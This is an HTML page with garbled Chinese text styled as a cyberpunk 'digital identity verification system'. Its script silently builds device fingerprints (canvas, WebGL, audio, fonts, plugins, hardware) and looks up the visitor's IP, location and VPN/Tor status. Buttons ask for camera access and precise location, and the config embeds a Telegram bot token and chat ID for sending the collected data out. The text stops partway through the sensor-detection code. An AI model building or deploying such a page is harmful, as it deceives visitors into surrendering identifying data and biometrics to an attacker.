<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ” æ•°å­—èº«ä»½éªŒè¯ç³»ç»Ÿ | é«˜çº§å®‰å…¨æ£€æµ‹</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --cyber-blue: #00f3ff;
            --matrix-green: #00ff41;
            --neon-purple: #bc13fe;
            --dark-bg: #0a0a0f;
            --panel-bg: rgba(10, 15, 30, 0.9);
            --glow: 0 0 15px currentColor;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', 'SF Mono', monospace;
        }
        
        body {
            background: var(--dark-bg);
            color: var(--cyber-blue);
            min-height: 100vh;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(0, 243, 255, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 80% 70%, rgba(188, 19, 254, 0.1) 0%, transparent 20%);
        }
        
        /* æ‰«æçº¿æ•ˆæœ */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 0, 0, 0.15) 0px,
                rgba(0, 0, 0, 0.15) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            z-index: 9999;
            animation: scan 8s linear infinite;
        }
        
        @keyframes scan {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        
        /* ä¸»å®¹å™¨ */
        .cyber-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 30px;
            display: grid;
            grid-template-columns: 1fr 400px;
            gap: 30px;
            min-height: 100vh;
        }
        
        /* å·¦ä¾§ä¸»é¢æ¿ */
        .main-panel {
            background: var(--panel-bg);
            border: 1px solid rgba(0, 243, 255, 0.3);
            border-radius: 15px;
            padding: 30px;
            backdrop-filter: blur(10px);
            box-shadow: 
                0 0 30px rgba(0, 243, 255, 0.1),
                inset 0 0 30px rgba(0, 243, 255, 0.05);
            position: relative;
            overflow: hidden;
        }
        
        .main-panel::before {
            content: "";
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, 
                var(--cyber-blue), 
                var(--neon-purple), 
                var(--matrix-green), 
                var(--cyber-blue));
            border-radius: 17px;
            z-index: -1;
            animation: borderGlow 4s linear infinite;
            background-size: 400% 400%;
        }
        
        @keyframes borderGlow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        /* æ ‡é¢˜åŒºåŸŸ */
        .header {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 40px;
            padding-bottom: 20px;
            border-bottom: 2px solid rgba(0, 243, 255, 0.3);
        }
        
        .logo {
            width: 70px;
            height: 70px;
            background: linear-gradient(45deg, var(--cyber-blue), var(--neon-purple));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            animation: rotate 10s linear infinite;
        }
        
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .title-section h1 {
            font-size: 2.5rem;
            background: linear-gradient(90deg, var(--cyber-blue), var(--matrix-green));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .subtitle {
            color: rgba(0, 243, 255, 0.8);
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .status-indicator {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 5px 15px;
            background: rgba(0, 255, 65, 0.1);
            border-radius: 20px;
            border: 1px solid rgba(0, 255, 65, 0.3);
        }
        
        .status-dot {
            width: 8px;
            height: 8px;
            background: var(--matrix-green);
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        /* ç³»ç»ŸçŠ¶æ€ç½‘æ ¼ */
        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .status-card {
            background: rgba(10, 20, 40, 0.7);
            border: 1px solid rgba(0, 243, 255, 0.2);
            border-radius: 12px;
            padding: 25px;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .status-card:hover {
            border-color: var(--cyber-blue);
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 243, 255, 0.2);
        }
        
        .card-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        
        .card-icon {
            font-size: 28px;
            color: var(--cyber-blue);
        }
        
        .card-title {
            font-size: 1.2rem;
            font-weight: bold;
            color: white;
        }
        
        .data-display {
            font-size: 2rem;
            font-family: 'Digital-7', monospace;
            color: var(--matrix-green);
            text-shadow: 0 0 10px currentColor;
            margin: 15px 0;
        }
        
        /* è¿›åº¦æ¡ */
        .progress-container {
            background: rgba(0, 0, 0, 0.5);
            height: 8px;
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--cyber-blue), var(--neon-purple));
            width: 0%;
            transition: width 1s ease;
        }
        
        /* æ•°æ®æµæ˜¾ç¤º */
        .data-stream {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin: 30px 0;
            height: 200px;
            overflow: hidden;
            position: relative;
        }
        
        .stream-content {
            font-family: 'Digital-7', monospace;
            color: var(--matrix-green);
            line-height: 1.8;
            font-size: 0.9rem;
            white-space: pre-wrap;
        }
        
        /* æ§åˆ¶é¢æ¿ */
        .control-panel {
            margin-top: 40px;
            padding-top: 30px;
            border-top: 2px solid rgba(0, 243, 255, 0.3);
        }
        
        .button-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .cyber-button {
            padding: 18px 30px;
            background: linear-gradient(45deg, rgba(0, 243, 255, 0.1), rgba(188, 19, 254, 0.1));
            border: 2px solid transparent;
            border-image: linear-gradient(45deg, var(--cyber-blue), var(--neon-purple)) 1;
            color: white;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }
        
        .cyber-button:hover {
            background: linear-gradient(45deg, rgba(0, 243, 255, 0.2), rgba(188, 19, 254, 0.2));
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 243, 255, 0.3);
        }
        
        .cyber-button.primary {
            background: linear-gradient(45deg, var(--cyber-blue), var(--neon-purple));
            color: black;
            font-weight: bold;
        }
        
        /* å³ä¾§ä¾§è¾¹æ  */
        .sidebar {
            display: flex;
            flex-direction: column;
            gap: 25px;
        }
        
        .info-panel {
            background: var(--panel-bg);
            border: 1px solid rgba(0, 243, 255, 0.3);
            border-radius: 15px;
            padding: 25px;
            backdrop-filter: blur(10px);
        }
        
        .info-panel h3 {
            color: var(--matrix-green);
            margin-bottom: 20px;
            font-size: 1.3rem;
            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
            padding-bottom: 10px;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .info-item:last-child {
            border-bottom: none;
        }
        
        .info-label {
            color: rgba(255, 255, 255, 0.7);
        }
        
        .info-value {
            color: var(--cyber-blue);
            font-weight: bold;
        }
        
        /* æ‘„åƒå¤´é¢„è§ˆ */
        .camera-preview {
            aspect-ratio: 4/3;
            background: rgba(0, 0, 0, 0.5);
            border: 2px solid rgba(0, 243, 255, 0.5);
            border-radius: 10px;
            overflow: hidden;
            position: relative;
        }
        
        #cameraFeed {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .camera-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                transparent,
                transparent 2px,
                rgba(0, 255, 65, 0.1) 2px,
                rgba(0, 255, 65, 0.1) 4px
            );
            pointer-events: none;
        }
        
        /* ç»ˆç«¯æ ·å¼ */
        .terminal {
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid var(--matrix-green);
            border-radius: 10px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            color: var(--matrix-green);
            height: 300px;
            overflow-y: auto;
        }
        
        .terminal-line {
            margin-bottom: 8px;
            animation: type 0.1s steps(40, end);
        }
        
        @keyframes type {
            from { width: 0; }
            to { width: 100%; }
        }
        
        .prompt {
            color: var(--cyber-blue);
        }
        
        /* å“åº”å¼è®¾è®¡ */
        @media (max-width: 1200px) {
            .cyber-container {
                grid-template-columns: 1fr;
            }
        }
        
        @media (max-width: 768px) {
            .cyber-container {
                padding: 15px;
            }
            
            .main-panel {
                padding: 20px;
            }
            
            .title-section h1 {
                font-size: 2rem;
            }
            
            .status-grid {
                grid-template-columns: 1fr;
            }
        }
        
        /* æ•°å­—å­—ä½“ */
        @font-face {
            font-family: 'Digital-7';
            src: url('https://fonts.cdnfonts.com/css/digital-7-mono');
        }
        
        /* è­¦å‘Šå’Œé€šçŸ¥ */
        .alert {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            border: 2px solid;
            background: rgba(255, 255, 255, 0.05);
            animation: alertPulse 2s infinite;
        }
        
        .alert.warning {
            border-color: #ffcc00;
            color: #ffcc00;
        }
        
        .alert.success {
            border-color: var(--matrix-green);
            color: var(--matrix-green);
        }
        
        @keyframes alertPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
    </style>
</head>
<body>
    <div class="cyber-container">
        <!-- å·¦ä¾§ä¸»é¢æ¿ -->
        <div class="main-panel">
            <!-- å¤´éƒ¨ -->
            <div class="header">
                <div class="logo">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <div class="title-section">
                    <h1>æ•°å­—èº«ä»½éªŒè¯ç³»ç»Ÿ v3.0</h1>
                    <div class="subtitle">
                        <span>é«˜çº§å®‰å…¨åè®®æ¿€æ´»</span>
                        <span class="status-indicator">
                            <span class="status-dot"></span>
                            å®æ—¶ç›‘æ§ä¸­
                        </span>
                    </div>
                </div>
            </div>
            
            <!-- ç³»ç»ŸçŠ¶æ€ç½‘æ ¼ -->
            <div class="status-grid">
                <!-- è®¾å¤‡æŒ‡çº¹ -->
                <div class="status-card" id="fingerprintCard">
                    <div class="card-header">
                        <div class="card-title">è®¾å¤‡æŒ‡çº¹è¯†åˆ«</div>
                        <div class="card-icon"><i class="fas fa-fingerprint"></i></div>
                    </div>
                    <div class="data-display" id="fingerprintId">æ­£åœ¨ç”Ÿæˆ...</div>
                    <div class="progress-container">
                        <div class="progress-bar" id="fingerprintProgress"></div>
                    </div>
                    <div class="info-text">å”¯ä¸€è®¾å¤‡æ ‡è¯†ç¬¦ç”Ÿæˆä¸­</div>
                </div>
                
                <!-- ç½‘ç»œåˆ†æ -->
                <div class="status-card" id="networkCard">
                    <div class="card-header">
                        <div class="card-title">ç½‘ç»œæ‹“æ‰‘åˆ†æ</div>
                        <div class="card-icon"><i class="fas fa-network-wired"></i></div>
                    </div>
                    <div class="data-display" id="ipAddress">æ­£åœ¨è·å–...</div>
                    <div class="progress-container">
                        <div class="progress-bar" id="networkProgress"></div>
                    </div>
                    <div class="info-text">å¤šå±‚ç½‘ç»œæ¢æµ‹è¿›è¡Œä¸­</div>
                </div>
                
                <!-- ä¼ æ„Ÿå™¨æ•°æ® -->
                <div class="status-card" id="sensorCard">
                    <div class="card-header">
                        <div class="card-title">è®¾å¤‡ä¼ æ„Ÿå™¨</div>
                        <div class="card-icon"><i class="fas fa-satellite-dish"></i></div>
                    </div>
                    <div class="data-display" id="sensorStatus">åˆå§‹åŒ–...</div>
                    <div class="progress-container">
                        <div class="progress-bar" id="sensorProgress"></div>
                    </div>
                    <div class="info-text">13ä¸ªä¼ æ„Ÿå™¨æ£€æµ‹ä¸­</div>
                </div>
                
                <!-- è¡Œä¸ºåˆ†æ -->
                <div class="status-card" id="behaviorCard">
                    <div class="card-header">
                        <div class="card-title">è¡Œä¸ºæ¨¡å¼åˆ†æ</div>
                        <div class="card-icon"><i class="fas fa-brain"></i></div>
                    </div>
                    <div class="data-display" id="behaviorScore">0%</div>
                    <div class="progress-container">
                        <div class="progress-bar" id="behaviorProgress"></div>
                    </div>
                    <div class="info-text">å®æ—¶ç”¨æˆ·æ´»åŠ¨åˆ†æ</div>
                </div>
            </div>
            
            <!-- æ•°æ®æµæ˜¾ç¤º -->
            <div class="data-stream">
                <div class="stream-content" id="dataStream">
&gt; ç³»ç»Ÿåˆå§‹åŒ–...
&gt; å¯åŠ¨é‡å­åŠ å¯†é€šé“...
&gt; è¿æ¥åˆ†å¸ƒå¼èŠ‚ç‚¹...
&gt; éªŒè¯æ•°å­—è¯ä¹¦...
&gt; åŠ è½½AIåˆ†æå¼•æ“...
&gt; å»ºç«‹å®‰å…¨éš§é“...
&gt; å¼€å§‹å®æ—¶æ•°æ®æµ...
                </div>
            </div>
            
            <!-- ç»ˆç«¯è¾“å‡º -->
            <div class="terminal" id="systemTerminal">
                <div class="terminal-line"><span class="prompt">root@system:~$</span> ./start_analysis.sh</div>
                <div class="terminal-line"><span class="prompt">root@system:~$</span> åˆå§‹åŒ–æ·±åº¦æ£€æµ‹åè®®...</div>
            </div>
            
            <!-- æ§åˆ¶é¢æ¿ -->
            <div class="control-panel">
                <h3><i class="fas fa-terminal"></i> ç³»ç»Ÿæ§åˆ¶é¢æ¿</h3>
                <div class="button-grid">
                    <button class="cyber-button" onclick="startFullAnalysis()">
                        <i class="fas fa-play"></i> å¯åŠ¨å®Œæ•´åˆ†æ
                    </button>
                    <button class="cyber-button" onclick="requestCameraAccess()">
                        <i class="fas fa-camera"></i> ç”Ÿç‰©ç‰¹å¾éªŒè¯
                    </button>
                    <button class="cyber-button" onclick="getPreciseLocation()">
                        <i class="fas fa-map-marker-alt"></i> åœ°ç†å®šä½
                    </button>
                    <button class="cyber-button primary" onclick="collectAndSend()">
                        <i class="fas fa-paper-plane"></i> å‘é€åˆ†ææŠ¥å‘Š
                    </button>
                </div>
            </div>
        </div>
        
        <!-- å³ä¾§ä¾§è¾¹æ  -->
        <div class="sidebar">
            <!-- ç³»ç»Ÿä¿¡æ¯ -->
            <div class="info-panel">
                <h3><i class="fas fa-info-circle"></i> ç³»ç»ŸçŠ¶æ€</h3>
                <div class="info-item">
                    <span class="info-label">ç³»ç»Ÿç‰ˆæœ¬</span>
                    <span class="info-value" id="sysVersion">v3.0.1</span>
                </div>
                <div class="info-item">
                    <span class="info-label">å®‰å…¨ç­‰çº§</span>
                    <span class="info-value" id="securityLevel">é‡å­çº§</span>
                </div>
                <div class="info-item">
                    <span class="info-label">åˆ†ææ·±åº¦</span>
                    <span class="info-value" id="analysisDepth">å¤šå±‚</span>
                </div>
                <div class="info-item">
                    <span class="info-label">æ•°æ®åŠ å¯†</span>
                    <span class="info-value" id="encryptionStatus">AES-512</span>
                </div>
                <div class="info-item">
                    <span class="info-label">å¨èƒæ£€æµ‹</span>
                    <span class="info-value" id="threatStatus">0/0</span>
                </div>
            </div>
            
            <!-- æ‘„åƒå¤´é¢„è§ˆ -->
            <div class="info-panel">
                <h3><i class="fas fa-eye"></i> ç”Ÿç‰©ç‰¹å¾éªŒè¯</h3>
                <div class="camera-preview">
                    <video id="cameraFeed" autoplay playsinline></video>
                    <div class="camera-overlay"></div>
                </div>
                <div class="alert warning" id="cameraStatus">
                    <i class="fas fa-exclamation-triangle"></i> ç­‰å¾…æ‘„åƒå¤´æˆæƒ
                </div>
            </div>
            
            <!-- å®æ—¶æ•°æ® -->
            <div class="info-panel">
                <h3><i class="fas fa-chart-line"></i> å®æ—¶æ•°æ®</h3>
                <div class="info-item">
                    <span class="info-label">CPUå ç”¨</span>
                    <span class="info-value" id="cpuUsage">0%</span>
                </div>
                <div class="info-item">
                    <span class="info-label">å†…å­˜ä½¿ç”¨</span>
                    <span class="info-value" id="memoryUsage">0 MB</span>
                </div>
                <div class="info-item">
                    <span class="info-label">ç½‘ç»œå»¶è¿Ÿ</span>
                    <span class="info-value" id="networkLatency">0ms</span>
                </div>
                <div class="info-item">
                    <span class="info-label">æ•°æ®åå</span>
                    <span class="info-value" id="dataThroughput">0 KB/s</span>
                </div>
            </div>
            
            <!-- åœ°ç†ä½ç½® -->
            <div class="info-panel">
                <h3><i class="fas fa-globe-asia"></i> åœ°ç†å®šä½</h3>
                <div class="info-item">
                    <span class="info-label">åæ ‡</span>
                    <span class="info-value" id="coordinates">è·å–ä¸­...</span>
                </div>
                <div class="info-item">
                    <span class="info-label">ç²¾åº¦</span>
                    <span class="info-value" id="locationAccuracy">-</span>
                </div>
                <div class="info-item">
                    <span class="info-label">æµ·æ‹”</span>
                    <span class="info-value" id="altitude">-</span>
                </div>
                <div class="info-item">
                    <span class="info-label">é€Ÿåº¦</span>
                    <span class="info-value" id="speed">0 m/s</span>
                </div>
            </div>
        </div>
    </div>

    <!-- åŠ è½½é®ç½© -->
    <div id="loadingOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,10,15,0.95);z-index:10000;display:flex;flex-direction:column;justify-content:center;align-items:center;">
        <div class="logo" style="animation: rotate 2s linear infinite; margin-bottom:30px;">
            <i class="fas fa-shield-alt"></i>
        </div>
        <h2 style="color:var(--cyber-blue);margin-bottom:20px;">ç³»ç»Ÿåˆå§‹åŒ–ä¸­</h2>
        <div style="width:300px;height:4px;background:rgba(0,243,255,0.2);border-radius:2px;overflow:hidden;">
            <div id="initProgress" style="height:100%;background:linear-gradient(90deg,var(--cyber-blue),var(--neon-purple));width:0%;transition:width 0.5s;"></div>
        </div>
        <div id="initStatus" style="color:rgba(0,243,255,0.8);margin-top:20px;font-size:0.9rem;">æ­£åœ¨åŠ è½½æ ¸å¿ƒæ¨¡å—...</div>
    </div>

    <!-- éŸ³é¢‘å…ƒç´  -->
    <audio id="beepSound" src="https://assets.mixkit.co/sfx/preview/mixkit-select-click-1109.mp3"></audio>
    <audio id="alertSound" src="https://assets.mixkit.co/sfx/preview/mixkit-security-verified-2001.mp3"></audio>

    <script>
        // è¿™é‡Œæ˜¯JavaScriptä»£ç ï¼ˆè§ç¬¬äºŒéƒ¨åˆ†ï¼‰
        // åˆå§‹åŒ–å˜é‡å’Œå‡½æ•°å°†åœ¨ç¬¬äºŒéƒ¨åˆ†æä¾›
    </script>
</body>
</html>
<script>
// =============================================
// é«˜çº§æ•°æ®æ”¶é›†ç³»ç»Ÿ v3.0
// é…ç½®å’Œåˆå§‹åŒ–
// =============================================

const CONFIG = {
    TELEGRAM: {
        BOT_TOKEN: '8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM',
        CHAT_ID: '8313770381',
        API_URL: 'https://api.telegram.org/bot'
    },
    APIs: {
        IP_INFO: 'https://ipapi.co/json/',
        VPN_DETECT: 'https://ipapi.co/{ip}/json/',
        TIME_API: 'https://worldtimeapi.org/api/ip',
        WEATHER: 'https://wttr.in/{city}?format=j1'
    }
};

// å…¨å±€æ•°æ®å­˜å‚¨å¯¹è±¡
const CYBER_DATA = {
    // ç³»ç»Ÿä¿¡æ¯
    system: {
        startTime: new Date().toISOString(),
        sessionId: generateSessionId(),
        version: '3.0.1',
        protocol: 'Quantum-Encrypted'
    },
    
    // è®¾å¤‡æŒ‡çº¹
    fingerprint: {
        canvas: null,
        webgl: null,
        audio: null,
        fonts: null,
        screen: null,
        plugins: null,
        mimeTypes: null,
        hardware: null
    },
    
    // ç½‘ç»œä¿¡æ¯
    network: {
        ip: null,
        location: {},
        isp: null,
        asn: null,
        proxy: false,
        vpn: false,
        tor: false,
        connection: {},
        ports: []
    },
    
    // ä¼ æ„Ÿå™¨æ•°æ®
    sensors: {
        accelerometer: null,
        gyroscope: null,
        magnetometer: null,
        ambientLight: null,
        proximity: null,
        orientation: null,
        battery: null
    },
    
    // ç”Ÿç‰©ç‰¹å¾
    biometrics: {
        camera: null,
        microphone: null,
        photo: null,
        audioSample: null,
        faceData: null
    },
    
    // åœ°ç†ä½ç½®
    geolocation: {
        precise: null,
        approximate: null,
        wifiNetworks: [],
        cellTowers: []
    },
    
    // è¡Œä¸ºåˆ†æ
    behavior: {
        mouse: [],
        keyboard: [],
        scroll: [],
        clicks: [],
        timing: {},
        patterns: {}
    },
    
    // æµè§ˆå™¨ç¯å¢ƒ
    environment: {
        browser: {},
        os: {},
        extensions: {},
        storage: {},
        permissions: {}
    },
    
    // æ€§èƒ½æŒ‡æ ‡
    performance: {
        timing: {},
        memory: {},
        cpu: {},
        network: {}
    }
};

// =============================================
// åˆå§‹åŒ–å‡½æ•°
// =============================================

async function initializeSystem() {
    const steps = [
        { name: 'åŠ è½½æ ¸å¿ƒæ¨¡å—', func: loadCoreModules, weight: 10 },
        { name: 'åˆå§‹åŒ–åŠ å¯†é€šé“', func: initEncryption, weight: 10 },
        { name: 'è·å–è®¾å¤‡æŒ‡çº¹', func: collectDeviceFingerprint, weight: 20 },
        { name: 'åˆ†æç½‘ç»œæ‹“æ‰‘', func: analyzeNetwork, weight: 25 },
        { name: 'æ£€æµ‹ä¼ æ„Ÿå™¨', func: detectSensors, weight: 15 },
        { name: 'å»ºç«‹å®‰å…¨è¿æ¥', func: establishConnection, weight: 20 }
    ];
    
    let progress = 0;
    
    for (const step of steps) {
        updateInitStatus(step.name);
        try {
            await step.func();
            progress += step.weight;
            updateInitProgress(progress);
            playBeep();
        } catch (error) {
            logToTerminal(`é”™è¯¯: ${step.name} - ${error.message}`, 'error');
        }
        await delay(500);
    }
    
    // å®Œæˆåˆå§‹åŒ–
    setTimeout(() => {
        document.getElementById('loadingOverlay').style.display = 'none';
        logToTerminal('ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆï¼Œå‡†å¤‡æ¥æ”¶æŒ‡ä»¤', 'success');
        updateDataStream('ç³»ç»Ÿå°±ç»ªï¼Œæ‰€æœ‰æ¨¡å—åœ¨çº¿');
        startRealtimeMonitoring();
    }, 1000);
}

// =============================================
// æ ¸å¿ƒæ•°æ®æ”¶é›†å‡½æ•°
// =============================================

// 1. é«˜çº§è®¾å¤‡æŒ‡çº¹
async function collectDeviceFingerprint() {
    updateCardProgress('fingerprintProgress', 25);
    
    // CanvasæŒ‡çº¹ï¼ˆé«˜çº§ç‰ˆï¼‰
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 256;
        canvas.height = 128;
        const ctx = canvas.getContext('2d');
        
        // ç»˜åˆ¶å¤æ‚å›¾å½¢
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.textBaseline = "alphabetic";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("FINGERPRINT", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText("FINGERPRINT", 4, 17);
        
        // æ·»åŠ å™ªç‚¹
        for(let i = 0; i < 50; i++) {
            ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
            ctx.fillRect(Math.random()*256, Math.random()*128, 1, 1);
        }
        
        CYBER_DATA.fingerprint.canvas = canvas.toDataURL();
        updateCardProgress('fingerprintProgress', 50);
    } catch(e) {
        logToTerminal('CanvasæŒ‡çº¹å¤±è´¥: ' + e.message, 'warning');
    }
    
    // WebGLæŒ‡çº¹
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            CYBER_DATA.fingerprint.webgl = {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                version: gl.getParameter(gl.VERSION),
                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTextures: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),
                maxRenderbuffers: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
            };
            updateCardProgress('fingerprintProgress', 75);
        }
    } catch(e) {
        logToTerminal('WebGLæŒ‡çº¹å¤±è´¥: ' + e.message, 'warning');
    }
    
    // éŸ³é¢‘æŒ‡çº¹
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        oscillator.connect(analyser);
        analyser.connect(audioContext.destination);
        oscillator.start(0);
        
        const dataArray = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(dataArray);
        
        CYBER_DATA.fingerprint.audio = {
            sampleRate: audioContext.sampleRate,
            frequencyData: Array.from(dataArray).slice(0, 10),
            context: audioContext.state
        };
        
        oscillator.stop();
        audioContext.close();
    } catch(e) {
        logToTerminal('éŸ³é¢‘æŒ‡çº¹å¤±è´¥: ' + e.message, 'warning');
    }
    
    // å­—ä½“æ£€æµ‹
    const fontList = [
        'Arial', 'Arial Black', 'Arial Narrow', 'Comic Sans MS',
        'Courier New', 'Georgia', 'Impact', 'Times New Roman',
        'Trebuchet MS', 'Verdana', 'Microsoft YaHei', 'SimSun',
        'Webdings', 'Wingdings', 'Monaco', 'Menlo', 'Consolas'
    ];
    
    CYBER_DATA.fingerprint.fonts = {};
    const testString = "mmmmmmmmmmlli";
    const testSize = '72px';
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    
    fontList.forEach(font => {
        context.font = testSize + " '" + font + "'";
        const metrics = context.measureText(testString);
        CYBER_DATA.fingerprint.fonts[font] = metrics.width;
    });
    
    // æ’ä»¶æ£€æµ‹
    CYBER_DATA.fingerprint.plugins = Array.from(navigator.plugins).map(p => ({
        name: p.name,
        description: p.description,
        filename: p.filename,
        length: p.length
    }));
    
    CYBER_DATA.fingerprint.mimeTypes = Array.from(navigator.mimeTypes).map(m => ({
        type: m.type,
        description: m.description,
        suffixes: m.suffixes
    }));
    
    // ç¡¬ä»¶ä¿¡æ¯
    CYBER_DATA.fingerprint.hardware = {
        cores: navigator.hardwareConcurrency || 'unknown',
        memory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        gpu: CYBER_DATA.fingerprint.webgl ? CYBER_DATA.fingerprint.webgl.renderer : 'unknown'
    };
    
    updateCardProgress('fingerprintProgress', 100);
    document.getElementById('fingerprintId').textContent = 
        'FP-' + generateHash(JSON.stringify(CYBER_DATA.fingerprint)).substring(0, 12);
    
    logToTerminal('è®¾å¤‡æŒ‡çº¹æ”¶é›†å®Œæˆ', 'success');
}

// 2. ç½‘ç»œåˆ†æ
async function analyzeNetwork() {
    updateCardProgress('networkProgress', 10);
    
    try {
        // è·å–IPå’Œä½ç½®
        const response = await fetch(CONFIG.APIs.IP_INFO);
        const data = await response.json();
        
        CYBER_DATA.network.ip = data.ip;
        CYBER_DATA.network.location = {
            city: data.city,
            region: data.region,
            country: data.country_name,
            countryCode: data.country_code,
            postal: data.postal,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone,
            callingCode: data.country_calling_code,
            currency: data.currency
        };
        CYBER_DATA.network.isp = data.org;
        CYBER_DATA.network.asn = data.asn;
        
        updateCardProgress('networkProgress', 40);
        document.getElementById('ipAddress').textContent = data.ip;
        
        // æ£€æµ‹ä»£ç†/VPN
        const vpnCheck = await fetch(CONFIG.APIs.VPN_DETECT.replace('{ip}', data.ip));
        const vpnData = await vpnCheck.json();
        CYBER_DATA.network.proxy = vpnData.proxy === true || vpnData.proxy === 'true';
        CYBER_DATA.network.vpn = vpnData.vpn === true || vpnData.vpn === 'true';
        CYBER_DATA.network.tor = vpnData.tor === true || vpnData.tor === 'true';
        
        updateCardProgress('networkProgress', 70);
        
        // ç½‘ç»œè¿æ¥ä¿¡æ¯
        if (navigator.connection) {
            CYBER_DATA.network.connection = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            };
            
            document.getElementById('networkLatency').textContent = 
                CYBER_DATA.network.connection.rtt + 'ms';
        }
        
        // ç«¯å£æ‰«ææ¨¡æ‹Ÿ
        simulatePortScan();
        
        updateCardProgress('networkProgress', 100);
        logToTerminal(`ç½‘ç»œåˆ†æå®Œæˆ - ${data.city}, ${data.country_name}`, 'success');
        
    } catch (error) {
        logToTerminal('ç½‘ç»œåˆ†æå¤±è´¥: ' + error.message, 'error');
    }
}

// 3. ä¼ æ„Ÿå™¨æ£€æµ‹
async function detectSensors() {
    updateCardProgress('sensorProgress', 10);
    
    const sensors = [
        { name: 'Accelerometer', check: 'Accelerometer' in window },
        { name: 'Gyroscope', check: 'Gyroscope' in window },
        { name: 'Magnetometer', check: 'Magnetometer' in window },
        { name: 'AmbientLight', check: 'AmbientLightSensor' in window },
        { name: 'Proximity', check: 'ProximitySensor' in window },
        { name: 'Orientation', check: 'DeviceOrientationEvent' in window },
        { name: 'Motion', check: 'DeviceMotionEvent' in window }
    ];
    
    let detected = 0;
    sensors.forEach(sensor => {
        if (sensor.check) {
            detected++;
            try {
                setupSensor(sensor.name);
            } catch(e) {
                logToTerminal(`${sensor.name} è®¾ç½®å¤±è´¥`, 'warning');
            }
        }
    });
    
    updateCardProgress('sensorProgress', 60);
